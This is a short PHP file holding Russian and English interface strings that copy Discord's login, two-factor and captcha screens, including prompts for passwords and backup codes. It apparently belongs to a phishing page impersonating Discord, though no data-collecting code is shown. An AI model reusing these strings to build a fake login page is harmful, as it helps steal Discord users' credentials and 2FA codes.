<?php
	$lang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);
    if($lang=="ru"){
        $alphabet=array(
            'С возвращением!',
            'Мы так рады видеть вас снова!',
            'Адрес электронной почты или номер телефона',
            'Обязательное поле',
            'Пароль',
            'Забыли пароль?',
            'Вход',
            'Нужна учётная запись?',
            'Зарегистрироваться',
            'Войти с помощью QR-кода',
            'Отсканируйте код с помощью ',
            'мобильного приложения Discord',
            ', чтобы сразу же войти в систему.',
            'Неверный логин или пароль.',
            'Обнаружено новое место авторизации. Пожалуйста, проверьте письмо в своём почтовом ящике.',
            'Неверные данные для входа или пароль.',
            'Некорректно указан адрес электронной почты.',
            'Произошла ошибка, попробуйте авторизоваться заново.'
        );

        $mfa=array(
            'Двухфакторная аутентификация',
            'Вы можете использовать резервный код или своё мобильное приложение двухфакторной аутентификации.',
            'Введите код аутентификации или резервный код Discord',
            '6-значный код подтверждения/8-значный резервный код',
            'Введите код аутентификации или резервный код Discord',
            'Вход',
            'Вернуться ко входу',
            'Invalid two-factor code'
        );
        $captcha=array(
            'С возвращением!',
            'Бип буп. Буп бип?'
        );
    }
    else{
        $alphabet=array(
            'Welcome back!',
            "We're so excited to see you again!",
            'Email or Phone Number',
            'Required field',
            'Password',
            'Forgot your password?',
            'Login',
            'Need an account?',
            'Register',
            'Log in with QR Code',
            'Scan this with the ',
            'Discord mobile app',
            ' to log in instantly',
            'Login or password is invalid.',
            'New login location detected, please check your e-mail.',
            'Invalid login information or password.',
            'The email address is specified incorrectly.',
            'An error occurred, try logging in again.'
        );
        $mfa=array(
            'Two-factor authentication',
            'You can use a backup code or your two-factor authentication mobile app.',
            'ENTER DISCORD AUTH/BACKUP CODE',
            '6-digit authentication code/8-digit backup code',
            'Enter the authentication code or the backup Discord code',
            'Login',
            'Go back to Login',
            'Invalid two-factor code'
        );
	   $captcha=array(
            'Welcome back!',
            'Beep boop. Boop beep?'
        );
    }
?>
